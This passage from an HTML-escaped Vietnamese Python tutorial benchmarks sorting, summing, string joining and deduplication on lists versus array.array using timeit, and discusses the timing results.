&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="s2"&gt;random.shuffle(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.8100354453472391&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ví dụ trên so sánh thời gian thực hiện của list.sort, sorted trên list, và sorted trên array khi sắp xếp mảng số nguyên 32 bit có 10 ngàn item. Chúng ta thấy thậm chí việc sắp xếp trên mảng bằng hàm sorted chậm hơn nhiều so với trên list.sort trong trường hợp này. Test này được thực hiện trên Python 3.1 với máy Pentium Dual Core 1.7MHz. Trên các phiên bản Python 2.x bạn chỉ cần viết &lt;strong&gt;a = range(10**4)&lt;/strong&gt; thay vì &lt;strong&gt;a = list(range(10**4))&lt;/strong&gt; Tiếp tục khảo sát với số phần tử đến 100 ngàn, 1 triệu, 10 triệu phần tử:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;a.sort()&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import random;a=range(10**5);random.shuffle(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;1.0628812891800408&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sorted(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import random;a=range(10**5);random.shuffle(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;13.890136599318794&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sorted(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import random,array;a=array.array(&amp;#39;L&amp;#39;, range(10**5));&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="s2"&gt;random.shuffle(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;14.082001048258462&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;a.sort()&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import random;a=range(10**6);random.shuffle(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;1.8611051722955381&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sorted(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import random;a=range(10**6);random.shuffle(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;1.9412927927796773&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sorted(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import random,array;a=array.array(&amp;#39;L&amp;#39;, range(10**6));&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="s2"&gt;random.shuffle(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;2.2266062190747107&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;a.sort()&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import random;a=range(10**7);random.shuffle(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;25.894550537010218&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sorted(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import random;a=range(10**7);random.shuffle(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;26.986440155994387&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sorted(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import random,array;a=array.array(&amp;#39;L&amp;#39;, range(10**7));&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="s2"&gt;random.shuffle(a)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;30.602503383151088&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hàm &lt;strong&gt;sort&lt;/strong&gt; của list là &lt;strong&gt;in-place&lt;/strong&gt; vì vậy nó nhanh hơn &lt;strong&gt;sorted&lt;/strong&gt; do không phải thực hiện các thao tác cấp phát bộ nhớ để tạo list mới như &lt;strong&gt;sorted&lt;/strong&gt;. Nó nhanh hơn đáng kể khi số phần tử là nhỏ. Trong test trên đây là khoảng 13 lần với 10 ngàn item và 100 ngàn item. Số các thao tác cấp phát bộ nhớ tăng tuyến tính theo số phần tử, trong khi số các phép so sánh tăng theo n*logn (hoặc nếu tốt hơn n*loglogn). Vì vậy khi tăng số lượng các item thì số các phép so sánh tăng nhanh hơn số các thao tác cấp phát bộ nhớ. Ở trên 1 triệu phần tử các phép toán so sánh chiếm đa số thời gian xử lý. Ta có thể thấy thời gian thực thi ở các hàm là tương đương nhau. Trên mức 10 triệu phần tử sự khác biệt không còn đáng kể nữa.&lt;/p&gt;
&lt;p&gt;Hàm &lt;strong&gt;sorted&lt;/strong&gt; thực thi trên array thường sẽ chậm hơn trên list trong sai khác thời gian tương đối nhỏ. Nguyên nhân có thể được giải thích là do sorted không tạo ra một array mà luôn luôn tạo ra một list. Rõ ràng &lt;strong&gt;sorted&lt;/strong&gt; trên một array nhưng trả lại list sẽ chậm hơn khi sorted trên list trả lại list. Các Efficient arrays muốn nhanh hơn list thực sự cần một sort của riêng chúng.&lt;/p&gt;
&lt;p&gt;Chuyển qua các thao tác khác với list. Chẳng hạn với hàm sum một list các số nguyên&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sum(x)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;x=range(1000)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.60629310370359235&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sum(x)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import array; x = array.array(&amp;#39;d&amp;#39;, range(1000))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.74805731663627739&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sum(x)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;x=range(10000)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.60768722812650822&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sum(x)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import array; x = array.array(&amp;#39;d&amp;#39;, range(10000))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.75720026176844613&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sum(x)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;x=range(10**5)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;1.1360591999478515&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sum(x)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import array; x = array.array(&amp;#39;d&amp;#39;, range(10**5))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.73434230670147826&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sum(x)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;x=range(10**6)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;1.9724225132735&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sum(x)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import array; x = array.array(&amp;#39;d&amp;#39;, range(10**6))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.73678350503251977&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sum(x)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;x=range(10**7)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;20.701364808722474&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sum(x)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import array; x = array.array(&amp;#39;d&amp;#39;, range(10**7))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;7.399070781130149&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hàm sum với array chậm hơn khi số phần tử nhỏ và càng ngày càng nhanh hơn khi số phần tử lớn hơn. Test sau đây cũng chỉ ra join các string là nhanh hơn hàm tounicode của array.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;u&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;65&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tounicode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXY&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;65&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXY&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;array.array(&amp;#39;u&amp;#39;, map(chr, range(65, 90))).tounicode()&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import array&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;14.721977927611988&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;#39;&amp;#39;.join(map(chr, range(65, 90)))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;8.788942485645748&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Để loại bỏ các phần tử trùng nhau của một list từ python 2.4 trở đi bạn có thể dùng lệnh &lt;strong&gt;L = list(set(L))&lt;/strong&gt;. Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
&lt;span class="go"&gt;[1, 2, 3, 5]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;L&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
&lt;span class="go"&gt;array(&amp;#39;L&amp;#39;, [1, 2, 3])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ví dụ sau so sánh thời gian loại trùng của array và list sử dụng cú pháp này:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;array(&amp;#39;L&amp;#39;, set(x))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;from array import array; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="s2"&gt; x = array(&amp;#39;L&amp;#39;, range(10**5))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.3053085107321749&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;list(set(x))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;x = range(10**5)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.25598173543039593&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;array(&amp;#39;L&amp;#39;, set(x))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;from array import array; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="s2"&gt;x = array(&amp;#39;L&amp;#39;, range(10**6))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;3.901955860623275&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;list(set(x))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;x = range(10**6)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;2.275834090902208&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
